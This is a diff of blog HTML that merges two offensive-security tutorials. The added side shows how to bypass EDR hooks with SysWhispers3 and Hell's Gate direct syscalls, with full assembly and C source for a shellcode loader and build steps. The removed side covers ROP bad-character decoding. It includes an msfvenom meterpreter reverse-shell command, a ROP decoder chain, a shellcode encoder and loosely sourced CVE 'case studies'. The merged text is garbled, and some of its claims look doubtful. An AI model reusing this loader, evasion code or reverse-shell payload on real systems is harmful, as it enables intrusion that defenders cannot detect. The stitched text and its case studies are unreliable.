+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return SW3_SyscallList.Entries[i].SyscallAddress;</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;}</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;return NULL;</p>
+
+
+
+<p class="wp-block-paragraph">}</p>
+
+
+
+<p class="wp-block-paragraph">It calls SW3_PopulateSyscallList function to populate the syscall list and then searches through it for the target function.</p>
+
+
+
+<p class="wp-block-paragraph">Syswhisper3 Example:</p>
+
+
+
+<p class="wp-block-paragraph">As an example we will be using syswhispers3 to invoke direct syscall on NtAllocateVirtualMemory as a PoC to see whether our edr.dll can hook it or not.</p>
 
 
 
 <ol class="wp-block-list">
-<li><strong>Bad Character Issues</strong>: When using tools like <code>msfvenom</code>, bad characters are specified with the <code>-b</code> argument (e.g., <code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.6 LPORT=1337 -b "\x00\x20\x21"</code>). The shellcode gets encoded to avoid these characters.</li>
-
-
-
-<li><strong>WriteProcessMemory and Execution Permissions</strong>: The <code>WriteProcessMemory</code> API writes data to specified memory locations, which must be writable and executable. If the location has no execution permissions, attempts to decode bad characters can lead to access violations.</li>
+<li>Generate necessary files using syswhispers3:</li>
 </ol>
 
 
 
-<h4 class="wp-block-heading">Weaponizing with Gadgets</h4>
+<figure class="wp-block-image"><img fetchpriority="high" decoding="async" width="1057" height="215" src="/wp-content/uploads/2023/10/image-8.png" alt="syswhispers3" class="wp-image-7641" srcset="/wp-content/uploads/2023/10/image-8.png 1057w, /wp-content/uploads/2023/10/image-8-300x61.png 300w, /wp-content/uploads/2023/10/image-8-1024x208.png 1024w, /wp-content/uploads/2023/10/image-8-768x156.png 768w" sizes="(max-width: 1057px) 100vw, 1057px" /></figure>
+
+
+<div class="wp-block-image">
+<figure class="aligncenter"><img decoding="async" width="688" height="252" src="/wp-content/uploads/2023/10/image-7.png" alt="generated files" class="wp-image-7640" srcset="/wp-content/uploads/2023/10/image-7.png 688w, /wp-content/uploads/2023/10/image-7-300x110.png 300w" sizes="(max-width: 688px) 100vw, 688px" /></figure>
+</div>
+
+
+<ol class="wp-block-list" start="2">
+<li>Copy the generated files to Visual Studio project root directory:</li>
+</ol>
+
+
+<div class="wp-block-image">
+<figure class="aligncenter"><img decoding="async" width="206" height="237" src="/wp-content/uploads/2023/10/image-5.png" alt="Enable MASM" class="wp-image-7638"/></figure>
+</div>
+
+
+<ol class="wp-block-list" start="3">
+<li>Enable MASM:</li>
+</ol>
 
 
 
-<p class="wp-block-paragraph">Using a target application like <strong>FastBackServer</strong> and analyzing its modules (e.g., <code>CSFTPAV6.dll</code>), we can find gadgets that perform necessary operations:</p>
+<figure class="wp-block-image"><img loading="lazy" decoding="async" width="1135" height="449" src="/wp-content/uploads/2023/10/image-12.png" alt="Import files in the project" class="wp-image-7645" srcset="/wp-content/uploads/2023/10/image-12.png 1135w, /wp-content/uploads/2023/10/image-12-300x119.png 300w, /wp-content/uploads/2023/10/image-12-1024x405.png 1024w, /wp-content/uploads/2023/10/image-12-768x304.png 768w" sizes="(max-width: 1135px) 100vw, 1135px" /></figure>
+
+
+
+<ol class="wp-block-list" start="4">
+<li>Import files in the project:</li>
+</ol>
+
+
+<div class="wp-block-image">
+<figure class="aligncenter"><img loading="lazy" decoding="async" width="282" height="201" src="/wp-content/uploads/2023/10/image-4.png" alt="Set ASM item type to Microsoft Macro Assembler" class="wp-image-7637"/></figure>
+</div>
+
+
+<ol class="wp-block-list" start="5">
+<li>Set ASM item type to Microsoft Macro Assembler:</li>
+</ol>
+
+
+
+<figure class="wp-block-image"><img loading="lazy" decoding="async" width="1105" height="497" src="/wp-content/uploads/2023/10/image-13.png" alt="execute" class="wp-image-7646" srcset="/wp-content/uploads/2023/10/image-13.png 1105w, /wp-content/uploads/2023/10/image-13-300x135.png 300w, /wp-content/uploads/2023/10/image-13-1024x461.png 1024w, /wp-content/uploads/2023/10/image-13-768x345.png 768w" sizes="(max-width: 1105px) 100vw, 1105px" /></figure>
+
+
+
+<ol class="wp-block-list" start="6">
+<li>Finally, execute:</li>
+</ol>
+
+
+<div class="wp-block-image">
+<figure class="aligncenter"><img loading="lazy" decoding="async" width="607" height="110" src="/wp-content/uploads/2023/10/image-11.png" alt="vx_table" class="wp-image-7644" srcset="/wp-content/uploads/2023/10/image-11.png 607w, /wp-content/uploads/2023/10/image-11-300x54.png 300w" sizes="(max-width: 607px) 100vw, 607px" /></figure>
+</div>
+
+
+<p class="wp-block-paragraph">As you can see edr.dll has indeed installed its hooks but cannot detect the use of NtAllocateVirtualMemory on PID 15148.</p>
+
+
+
+<p class="wp-block-paragraph">Hell’s gate</p>
+
+
+
+<p class="wp-block-paragraph">Hell&#8217;s gate is used to perform direct syscalls. It reads through ntdll and dynamically finds syscalls and executes them from the binary.</p>
+
+
+
+<p class="wp-block-paragraph">When using hell&#8217;s gate, we have to first declare a _VX_TABLE_ENTRY structure that contains data associated with a system call:</p>
+
+
+
+<pre class="wp-block-code"><code>typedef struct _VX_TABLE_ENTRY {
+
+PVOID pAddress;
+
+DWORD64 dwHash;
+
+WORD wSystemCall;
+
+} VX_TABLE_ENTRY, * PVX_TABLE_ENTRY;
+
+_VX_TABLE_ENTYR itself will be a member of a larger structure named _VX_TABLE:
+
+typedef struct _VX_TABLE {
+
+VX_TABLE_ENTRY NtAllocateVirtualMemory;
+
+VX_TABLE_ENTRY NtProtectVirtualMemory;
+
+VX_TABLE_ENTRY NtCreateThreadEx;
+
+VX_TABLE_ENTRY NtWaitForSingleObject;
+
+} VX_TABLE, * PVX_TABLE;
+
+Then it retrieves a pointer to PEB and traverse the in-memory order module list to NTDLL and the invokes the GetVxTableEntry function used to populate _VX_TABLE strcutre using ntdll's EAT.
+
+BOOL GetVxTableEntry(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, PVX_TABLE_ENTRY
+
+pVxTableEntry) {
+
+PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory-
+
+&gt;AddressOfFunctions);
+
+PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory-&gt;AddressOfNames);
+
+PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)pModuleBase + pImageExportDirectory-
+
+&gt;AddressOfNameOrdinals);
+
+for (WORD cx = 0; cx &lt; pImageExportDirectory-&gt;NumberOfNames; cx++) {
+
+PCHAR pczFunctionName = (PCHAR)((PBYTE)pModuleBase + pdwAddressOfNames&#91;cx]);
+
+PVOID pFunctionAddress = (PBYTE)pModuleBase +
+
+pdwAddressOfFunctions&#91;pwAddressOfNameOrdinales&#91;cx]];
+
+if (djb2(pczFunctionName) == pVxTableEntry-&gt;dwHash) {
+
+pVxTableEntry-&gt;pAddress = pFunctionAddress;
+
+// MOV EAX
+
+if (*((PBYTE)pFunctionAddress + 3) == 0xb8) {
+
+BYTE high = *((PBYTE)pFunctionAddress + 5);
+
+BYTE low = *((PBYTE)pFunctionAddress + 4);
+
+pVxTableEntry-&gt;wSystemCall = (high &lt;&lt; 8) | low;
+
+break;
+
+}
+
+}
+
+}
+
+return TRUE;
+
+}
+
+It checks for the presence of mov r10, rcx and mov rcx, ssn and when found they can be used to execute a payload.
+
+BOOL Payload(PVX_TABLE pVxTable) {
+
+NTSTATUS status = 0x00000000;
+
+char shellcode&#91;] = "\x90\x90\x90\x90\xcc\xcc\xcc\xcc\xc3";
+
+// Allocate memory for the shellcode
+
+PVOID lpAddress = NULL;
+
+SIZE_T sDataSize = sizeof(shellcode);
+
+HellsGate(pVxTable-&gt;NtAllocateVirtualMemory.wSystemCall);
+
+status = HellDescent((HANDLE)-1, &amp;lpAddress, 0, &amp;sDataSize, MEM_COMMIT, PAGE_READWRITE);
+
+// Write Memory (i.e. RtlMoveMemory)
+
+VxMoveMemory(lpAddress, shellcode, sizeof(shellcode));
+
+// Change page permissions
+
+ULONG ulOldProtect = NULL;
+
+HellsGate(pVxTable-&gt;NtProtectVirtualMemory.wSystemCall);
+
+status = HellDescent((HANDLE)-1, &amp;lpAddress, &amp;sDataSize, PAGE_EXECUTE_READ, &amp;ulOldProtect);
+
+// Create thread
+
+HANDLE hHostThread = INVALID_HANDLE_VALUE;
+
+HellsGate(pVxTable-&gt;NtCreateThreadEx.wSystemCall);
+
+status = HellDescent(&amp;hHostThread, 0x1FFFFF, NULL, (HANDLE)-1, (LPTHREAD_START_ROUTINE)lpAddress,
+
+NULL, FALSE, NULL, NULL, NULL, NULL);
+
+// Wait for 1 seconds
+
+LARGE_INTEGER Timeout;
+
+Timeout.QuadPart = -10000000;
+
+HellsGate(pVxTable-&gt;NtWaitForSingleObject.wSystemCall);
+
+status = HellDescent(hHostThread, FALSE, &amp;Timeout);
+
+return TRUE;
+
+}</code></pre>
+
+
+
+<p class="wp-block-paragraph">Example</p>
+
+
+
+<p class="wp-block-paragraph">We are going to use the default code that is in hell’s gate repository with just a few modifications.</p>
 
 
 
 <ol class="wp-block-list">
-<li><strong>Types of Gadgets</strong>:
-<ul class="wp-block-list">
-<li><code>add byte [reg]</code></li>
+<li>Clone the repository in Visual Studio: <a href="https://github.com/am0nsec/HellsGate">https://github.com/am0nsec/HellsGate</a></li>
 
 
 
-<li><code>sub byte [reg]</code></li>
+<li>Change&nbsp; _VX_TABLE fields. You can place the functions you want to use in this structure, for simplicity’s sake, I’m leaving them to be the default ones:</li>
+</ol>
 
 
-
-<li>Bitwise operations (<code>ror</code>, <code>rol</code>, <code>shr</code>, <code>shl</code>, <code>or</code>, <code>and</code>)</li>
-</ul>
-</li>
-
+<div class="wp-block-image">
+<figure class="aligncenter"><img loading="lazy" decoding="async" width="408" height="130" src="/wp-content/uploads/2023/10/image-10.png" alt="hellsgame program" class="wp-image-7643" srcset="/wp-content/uploads/2023/10/image-10.png 408w, /wp-content/uploads/2023/10/image-10-300x96.png 300w" sizes="(max-width: 408px) 100vw, 408px" /></figure>
+</div>
 
 
-<li><strong>Example Gadgets</strong>:
-<ul class="wp-block-list">
-<li><code>0x5050626e: add byte [esi+0x3B], ah ; ret ;</code> (decoding gadget)</li>
-</ul>
-</li>
+<ol class="wp-block-list" start="3">
+<li>Change the Payload function per your needs. I only added my own shellcode and a printf,&nbsp; But you can change the functions and use something completely different:</li>
 </ol>
 
 
 
-<h4 class="wp-block-heading">Steps for ROP Decoding</h4>
+<figure class="wp-block-image"><img loading="lazy" decoding="async" width="968" height="669" src="/wp-content/uploads/2023/10/image-9.png" alt="djb2 function" class="wp-image-7642" srcset="/wp-content/uploads/2023/10/image-9.png 968w, /wp-content/uploads/2023/10/image-9-300x207.png 300w, /wp-content/uploads/2023/10/image-9-768x531.png 768w" sizes="(max-width: 968px) 100vw, 968px" /></figure>
 
 
 
-<p class="wp-block-paragraph">To decode bad characters using the identified gadgets, follow these steps:</p>
-
-
-
-<ol class="wp-block-list">
-<li><strong>Make <code>esi + 0x3B</code> Point to the Bad Character</strong>:
-<ul class="wp-block-list">
-<li>Use gadgets to calculate the correct pointer.</li>
-</ul>
-</li>
-
-
-
-<li><strong>Pop the Decoding Value into <code>eax</code></strong>:
-<ul class="wp-block-list">
-<li>This value is used to add to the memory location where the bad character resides.</li>
-</ul>
-</li>
-
-
-
-<li><strong>Execute the Decoding Gadget</strong>:
-<ul class="wp-block-list">
-<li>Use the <code>add</code> instruction to modify the byte at the location pointed to by <code>esi</code>.</li>
-</ul>
-</li>
+<ol class="wp-block-list" start="4">
+<li>Change the main function. You should set each function’s hash value, in the default code, they were hardcoded and I only replaced the hardcoded ones with the djb2 function to dynamically calculate them and also a printf and a getchar before executing the Payload function:</li>
 </ol>
 
 
 
-<h4 class="wp-block-heading">Example ROP Decoder Code</h4>
+<figure class="wp-block-image"><img loading="lazy" decoding="async" width="1202" height="659" src="/wp-content/uploads/2023/10/image-14.png" alt="execute" class="wp-image-7647" srcset="/wp-content/uploads/2023/10/image-14.png 1202w, /wp-content/uploads/2023/10/image-14-300x164.png 300w, /wp-content/uploads/2023/10/image-14-1024x561.png 1024w, /wp-content/uploads/2023/10/image-14-768x421.png 768w" sizes="(max-width: 1202px) 100vw, 1202px" /></figure>
 
 
 
-<p class="wp-block-paragraph">Here&#8217;s an example of how to construct the ROP chain for decoding bad characters.</p>
-
-
-
-<pre class="wp-block-code"><code>from struct import pack
-
-# ROP Decoder Construction
-ROPDecoder = b""
-ROPDecoder += pack("&lt;L", 0x5050118e)  # mov eax, esi ; pop esi ; ret ;
-ROPDecoder += pack("&lt;L", 0x41414141)  # dummy value for pop esi
-ROPDecoder += pack("&lt;L", 0x5052db24)  # pop ecx ; ret ;
-ROPDecoder += pack("&lt;L", negative_offset_value_to_shellcode)  # negative offset
-ROPDecoder += pack("&lt;L", 0x50533bf4)  # sub eax, ecx ; ret ;
-ROPDecoder += pack("&lt;L", 0x505263f9)  # push eax ; pop esi ; pop ebx ; ret ;
-ROPDecoder += pack("&lt;L", 0x41414141)  # dummy value for pop ebx
-ROPDecoder += pack("&lt;L", 0x5053a0f5)  # pop eax ; ret ;
-ROPDecoder += pack("&lt;L", decoding_value)  # decoding value
-ROPDecoder += pack("&lt;L", 0x5050626e)  # add byte &#91;esi+0x3B], ah ; ret ;</code></pre>
-
-
-
-<h4 class="wp-block-heading">Encoding and Decoding Process</h4>
-
-
-
-<ol class="wp-block-list">
-<li><strong>Encoding</strong>: Replace each bad character in the shellcode with an alternate value.
-<ul class="wp-block-list">
-<li>Example: Replace <code>0x00</code> with <code>0xfd</code>, <code>0x0a</code> with <code>0x05</code>, etc.</li>
-</ul>
-</li>
-
-
-
-<li><strong>Decoding</strong>: Revert the encoded bad characters back to their original values during execution using the ROP chain.</li>
+<ol class="wp-block-list" start="5">
+<li>Execution:</li>
 </ol>
 
 
+<div class="wp-block-image">
+<figure class="aligncenter"><img loading="lazy" decoding="async" width="614" height="85" src="/wp-content/uploads/2023/10/image-6.png" alt="" class="wp-image-7639" srcset="/wp-content/uploads/2023/10/image-6.png 614w, /wp-content/uploads/2023/10/image-6-300x42.png 300w" sizes="(max-width: 614px) 100vw, 614px" /></figure>
+</div>
 
-<pre class="wp-block-code"><code>def encode_shellcode(shellcode, badchars, encode_value):
-    shellcode_bytes = shellcode.split("\\x")
-    encoded_shellcode = &#91;]
-    index = 0
-    for byte in shellcode_bytes:
-        if byte:
-            if byte in badchars:
-                encoded_int = (int(byte, 16) + encode_value) &amp; 0xFF
-                encoded_hex = hex(encoded_int)&#91;2:].zfill(2)
-                encoded_shellcode.append(f"\\x{encoded_hex}")
-            else:
-                encoded_shellcode.append(f"\\x{byte}")
-        index += 1
-    return ''.join(encoded_shellcode)
 
-# Example of usage
-with open("shellcode.txt", "r") as file:
-    my_shellcode = file.read()
+<p class="wp-block-paragraph">As you can see, edr.dll could not detect the use of NtAllocateVirtualMemory.</p>
 
-badchars = &#91;"00", "09", "0a", "0b", "0c", "0d", "20"]
-encoded_shellcode = encode_shellcode(my_shellcode, badchars, 0xfb)
-print("&#91;+] Encoded Shellcode:", encoded_shellcode)</code></pre>
 
 
+<p class="wp-block-paragraph">Hell’s hall</p>
 
-<h4 class="wp-block-heading">Automating the Process</h4>
 
 
+<p class="wp-block-paragraph">Hell’s hall developed by the Maldev academy is a combination of hell’s gate and indirect syscalls. Unlinke hell’s gate which is used to invoke direct syscalls, Hell’s hall combines the hell’s gate&nbsp; and tartarus gate’s techniques and invokes indirect syscalls.</p>
 
-<p class="wp-block-paragraph">To fully automate encoding and decoding, implement functions that handle both tasks. Here&#8217;s an advanced version of the encoding function:</p>
 
 
+<h2 class="wp-block-heading" id="h-tartarusgate">Tartarusgate</h2>
 
-<pre class="wp-block-code"><code>from struct import pack
 
-def encode_shellcode(shellcode, badchars, encode_value):
-    shellcode_bytes = shellcode.split("\\x")
-    bad_index = &#91;]
-    encoded_shellcode = &#91;]
-    index = 0
-    for byte in shellcode_bytes:
-        if byte:
-            if byte in badchars:
-                encoded_int = (int(byte, 16) + encode_value) &amp; 0xFF
-                encoded_hex = hex(encoded_int)&#91;2:].zfill(2)
-                encoded_shellcode.append(f"\\x{encoded_hex}")
-                bad_index.append(index)
-            else:
-                encoded_shellcode.append(f"\\x{byte}")
-        index += 1
-    return ''.join(encoded_shellcode), bad_index
 
-# Example of usage
-encoded_shellcode, bad_indices = encode_shellcode(my_shellcode, badchars, 0xfb)
-print("&#91;+] Encoded Shellcode:", encoded_shellcode)
-print("&#91;+] Bad Indices:", bad_indices)</code></pre>
+<p class="wp-block-paragraph">The HellsGate technique is a method used for dynamic system call invocation. This technique is particularly useful in the realm of low-level programming, especially when one wants to bypass certain security mechanisms or avoid detection by security software. Let&#8217;s break down the provided code to understand its functionality and purpose.</p>
 
 
 
-<h4 class="wp-block-heading"><strong><em>Tooling and Exploitation Frameworks</em></strong></h4>
+<p class="wp-block-paragraph">1. hellsgate.asm:</p>
 
 
 
-<p class="wp-block-paragraph"><strong><em>Tools for Finding and Using ROP Gadgets:</em></strong></p>
+<p class="wp-block-paragraph">This Assembly file defines two procedures: HellsGate and HellDescent.</p>
 
 
 
-<ol class="wp-block-list">
-<li><strong><em>ROPgadget:</em></strong></li>
-</ol>
+<p class="wp-block-paragraph">HellsGate PROC:</p>
 
 
 
-<p class="wp-block-paragraph">&nbsp; &nbsp; &#8211; <strong>Overview:</strong> ROPgadget scans binaries for ROP gadgets and lists them for use in constructing exploits.</p>
+<p class="wp-block-paragraph">This procedure seems to be setting up a system call number. It uses the nop instruction, which is a placeholder that does nothing, possibly for alignment or obfuscation purposes.</p>
 
 
 
-<p class="wp-block-paragraph">&nbsp; &nbsp; &#8211; <strong>Command Example:</strong></p>
+<p class="wp-block-paragraph">The system call number is moved into the wSystemCall variable from the ecx register.</p>
 
 
 
-<p class="wp-block-paragraph">&nbsp; &nbsp; &nbsp; &nbsp; <code>ROPgadget --binary your_binary_file --all</code></p>
+<p class="wp-block-paragraph">HellDescent PROC:</p>
 
 
 
-<p class="wp-block-paragraph">&nbsp; &nbsp; &#8211; <strong>Features and Functionalities:</strong> Lists all gadgets in the binary, including addresses and instructions. You can filter gadgets based on specific criteria.</p>
+<p class="wp-block-paragraph">This procedure prepares for the actual system call. The rax and r10 registers are set up, and then the system call number is moved into the eax register.</p>
 
 
 
-<ol start="2" class="wp-block-list">
-<li><strong><em>Ropper:</em></strong></li>
-</ol>
+<p class="wp-block-paragraph">The syscall instruction is then executed, which invokes the system call.</p>
 
 
 
-<p class="wp-block-paragraph">&nbsp; &nbsp; &#8211; <strong>Overview:</strong> Ropper is a tool for finding and analyzing ROP gadgets, and supports various architectures.</p>
+<p class="wp-block-paragraph">2. hellsgate.c:</p>
 
 
 
-<p class="wp-block-paragraph">&nbsp; &nbsp; &#8211; <strong>Command Example:</strong></p>
+<p class="wp-block-paragraph">This C file contains the main logic and functions that utilize the HellsGate technique.</p>
 
 
 
-<p class="wp-block-paragraph">&nbsp; &nbsp; &nbsp; &nbsp; <code>ropper --file your_binary_file --find 'pop rdi; ret'</code></p>
+<p class="wp-block-paragraph">Data Structures:</p>
 
 
 
-<p class="wp-block-paragraph">&nbsp; &nbsp; &#8211; <strong>Features and Functionalities:</strong> Allows for detailed gadget listing and filtering, useful for constructing specific ROP chains.</p>
+<p class="wp-block-paragraph">The file defines several structures, most notably the VX_TABLE and VX_TABLE_ENTRY. These structures seem to be used for storing information about various system calls, including their addresses and hashes.</p>
 
 
 
-<ol class="wp-block-list">
-<li><strong><em>ROPgadget.py:</em></strong></li>
-</ol>
+<p class="wp-block-paragraph">RtlGetThreadEnvironmentBlock():</p>
 
 
 
-<p class="wp-block-paragraph">&nbsp; &nbsp; &#8211; <strong><em>Overview:</em></strong> ROPgadget.py is a Python script version of ROPgadget, offering similar functionalities for gadget discovery and analysis.</p>
+<p class="wp-block-paragraph">This function retrieves the Thread Environment Block (TEB) for the current thread. The TEB contains information about the thread&#8217;s state and its associated resources.</p>
 
 
 
-<p class="wp-block-paragraph">&nbsp; &nbsp; &#8211; <strong><em>Command Example:</em></strong></p>
+<p class="wp-block-paragraph">djb2():</p>
 
 
 
-<p class="wp-block-paragraph">&nbsp; &nbsp; &nbsp; &nbsp; <code>python ROPgadget.py --binary your_binary_file --all</code></p>
+<p class="wp-block-paragraph">A hash function used to compute a hash value for a given string. This might be used to quickly identify system calls or other entities.</p>
 
 
 
-<p class="wp-block-paragraph">&nbsp; &nbsp; &#8211; <strong><em>Features and Functionalities:</em></strong> Provides detailed gadget information and can be integrated into custom scripts for automated exploitation.</p>
+<p class="wp-block-paragraph">GetImageExportDirectory() and GetVxTableEntry():</p>
 
 
 
-<h3 class="wp-block-heading">Practical Applications and Case Studies</h3>
+<p class="wp-block-paragraph">These functions are used to retrieve the Export Address Table (EAT) of a module (like NTDLL) and to populate the VX_TABLE with the addresses of specific system calls.</p>
 
 
 
-<h4 class="wp-block-heading">Real-World Examples:</h4>
+<p class="wp-block-paragraph">Payload():</p>
 
 
 
-<p class="wp-block-paragraph"><strong><em>1. Notable Exploits Utilizing ROP:</em></strong></p>
+<p class="wp-block-paragraph">This function seems to be the main payload that will be executed. It dynamically resolves system calls using the HellsGate technique and then performs various operations, such as memory allocation, writing to memory, changing memory permissions, and creating a new thread.</p>
 
 
 
-<p class="wp-block-paragraph"><strong><em>1.1. The &#8220;Zerodium iOS 10.3.3 Exploit&#8221;:</em></strong> In 2017, a zero-day exploit targeting iOS 10.3.3 involved a ROP-based attack. The vulnerability in the kernel allowed an attacker to escalate privileges and execute arbitrary code. The exploit utilized ROP to bypass ASLR and DEP protections. An example ROP chain used in this exploit might look like:</p>
+<p class="wp-block-paragraph">VxMoveMemory():</p>
 
 
 
-<pre class="wp-block-code"><code>1. Pop address of kernel function into register&amp;nbsp;
+<p class="wp-block-paragraph">A custom implementation of the memory move operation. It ensures that the memory regions being copied do not overlap.</p>
 
-2. Execute kernel function with controlled parameters&amp;nbsp;
 
-3. Return to controlled location</code></pre>
 
+<pre class="wp-block-code"><code>HellsGate/hellsgate.asm
 
+; Hell's Gate
 
-<p class="wp-block-paragraph"><strong><em>Example Code:</em></strong></p>
+; Dynamic system call invocation&nbsp;
 
+;&nbsp;
 
+; by smelly__vx (@RtlMateusz) and am0nsec (@am0nsec)
 
-<pre class="wp-block-code"><code>pop rdi&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ; Gadget to pop value into rdi (used for kernel function address)&amp;nbsp;
+.data
 
-ret&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ; Return to next instruction &amp;nbsp;
+wSystemCall DWORD 000h
 
-mov rax, &#91;rdi] &amp;nbsp; ; Load kernel function address from rdi into rax&amp;nbsp;
+.code&nbsp;
 
-call rax &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ; Call the kernel function</code></pre>
+HellsGate PROC
 
+nop
 
+mov wSystemCall, 000h
 
-<p class="wp-block-paragraph">By chaining gadgets like these, the attacker could control kernel execution flow and exploit the vulnerability.</p>
+nop
 
+mov wSystemCall, ecx
 
+nop
 
-<p class="wp-block-paragraph"><strong><em>1.2. The &#8220;Microsoft Internet Explorer 9&#8221; Exploit (CVE-2014-6332):</em></strong> This vulnerability allowed remote code execution through Internet Explorer 9. Exploiting it required bypassing security features with ROP. Attackers utilized ROP to create a chain of gadgets that manipulated memory and executed arbitrary code.</p>
+ret
 
+HellsGate ENDP
 
+HellDescent PROC
 
-<pre class="wp-block-code"><code>mov rbx, &#91;rsp + 8] ; Move address into rbx&amp;nbsp;
+nop
 
-pop rdi&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ; Pop value into rdi&amp;nbsp;
+mov rax, rcx
 
-ret&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ; Return to next instruction &amp;nbsp;
+nop
 
-mov &#91;rbx], rdi &amp;nbsp; &amp;nbsp; ; Store value from rdi to address in rbx&amp;nbsp;
+mov r10, rax
 
-ret&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ; Return to next instruction`</code></pre>
+nop
 
+mov eax, wSystemCall
 
+nop
 
-<p class="wp-block-paragraph">The gadgets were carefully selected and combined to perform actions that could bypass IE&#8217;s security features.</p>
+syscall
 
+ret
 
+HellDescent ENDP
 
-<p class="wp-block-paragraph"><strong><em>Case Studies Demonstrating the Effectiveness of ROP:</em></strong></p>
+end
 
+HellsGate/main.c
 
+INT wmain() {
 
-<p class="wp-block-paragraph"><strong><em>2.1. Case Study: &#8220;Google Chrome Zero-Day Exploit&#8221; (CVE-2018-6177):</em></strong> In 2018, a zero-day vulnerability in Google Chrome was exploited using ROP. The attack involved a ROP chain that bypassed Chrome’s ASLR by exploiting a memory corruption bug. The ROP chain used gadgets to pivot the stack and manipulate memory to execute malicious payloads.</p>
+//int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
 
+PTEB pCurrentTeb = RtlGetThreadEnvironmentBlock();
 
+PPEB pCurrentPeb = pCurrentTeb-&gt;ProcessEnvironmentBlock;
 
-<p class="wp-block-paragraph"><strong><em>Example Code:</em></strong></p>
+if (!pCurrentPeb || !pCurrentTeb || pCurrentPeb-&gt;OSMajorVersion != 0xA)
 
+return 0x1;
 
+// Get NTDLL module&nbsp;
 
-<pre class="wp-block-code"><code>pop rdi &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ; Gadget to pop value into rdi&amp;nbsp;
+PLDR_DATA_TABLE_ENTRY pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pCurrentPeb-&gt;LoaderData-&gt;InMemoryOrderModuleList.Flink-&gt;Flink - 0x10);
 
-ret &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ; Return to next instruction &amp;nbsp;
+// Get the EAT of NTDLL
 
-mov &#91;rbx], rdi&amp;nbsp; &amp;nbsp; ; Write value from rdi to memory at address in rbx&amp;nbsp;
+PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;
 
-pop rax &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ; Pop another value into rax (e.g., function pointer) call rax&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ; Call function at address in rax</code></pre>
+if (!GetImageExportDirectory(pLdrDataEntry-&gt;DllBase, &amp;pImageExportDirectory) || pImageExportDirectory == NULL)
 
+return 0x01;
 
+VX_TABLE Table = { 0 };
 
-<p class="wp-block-paragraph">By chaining these gadgets, the exploit successfully bypassed Chrome&#8217;s security measures.</p>
+Table.NtAllocateVirtualMemory.dwHash = 0xf5bd373480a6b89b;
 
+if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;Table.NtAllocateVirtualMemory))
 
+return 0x1;
 
-<p class="wp-block-paragraph"><strong><em>2.2. Case Study: &#8220;Ubuntu Linux Kernel Exploit&#8221;:</em></strong> An exploit targeting the Ubuntu Linux kernel used ROP to bypass security features. The attacker used a ROP chain to manipulate kernel data structures and escalate privileges.</p>
+Table.NtCreateThreadEx.dwHash = 0x64dc7db288c5015f;
 
+if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;Table.NtCreateThreadEx))
 
+return 0x1;
 
-<p class="wp-block-paragraph"><strong><em>Example Code:</em></strong></p>
+Table.NtWriteVirtualMemory.dwHash = 0x68a3c2ba486f0741;
 
+if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;Table.NtWriteVirtualMemory))
 
+return 0x1;
 
-<pre class="wp-block-code"><code>pop rdi &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ; Gadget to set up rdi with an address&amp;nbsp;
+Table.NtProtectVirtualMemory.dwHash = 0x858bcb1046fb6a37;
 
-mov rsi, rdi&amp;nbsp; &amp;nbsp; &amp;nbsp; ; Move address to rsi&amp;nbsp;
+if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;Table.NtProtectVirtualMemory))
 
-pop rax &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ; Load kernel function pointer into rax&amp;nbsp;
+return 0x1;
 
-call rax&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ; Call kernel function</code></pre>
+Table.NtWaitForSingleObject.dwHash = 0xc6a2fa174e551bcb;
 
+if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;Table.NtWaitForSingleObject))
 
+return 0x1;
 
-<p class="wp-block-paragraph">This case study highlights how ROP can be used to bypass kernel protections and escalate privileges.</p>
+Payload(&amp;Table);
 
+return 0x00;
 
+}</code></pre>
 
